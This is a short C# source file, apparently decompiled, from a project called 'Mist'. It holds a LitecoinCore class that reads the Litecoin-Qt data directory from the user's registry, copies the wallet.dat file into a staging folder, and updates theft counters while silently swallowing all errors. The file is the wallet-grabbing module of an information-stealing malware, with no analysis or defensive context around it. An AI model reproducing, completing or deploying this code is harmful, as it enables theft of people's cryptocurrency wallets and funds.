using System;
using System.IO;
using Microsoft.Win32;

namespace Mist
{
	// Token: 0x0200006D RID: 109
	internal class LitecoinCore
	{
		// Token: 0x0600029A RID: 666 RVA: 0x000128A8 File Offset: 0x00010AA8
		public static void LitecStr(string directorypath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
				{
					try
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\LitecoinCore\\");
						File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\LitecoinCore\\wallet.dat");
						LitecoinCore.count++;
						Wallets.count++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400016A RID: 362
		public static int count;
	}
}
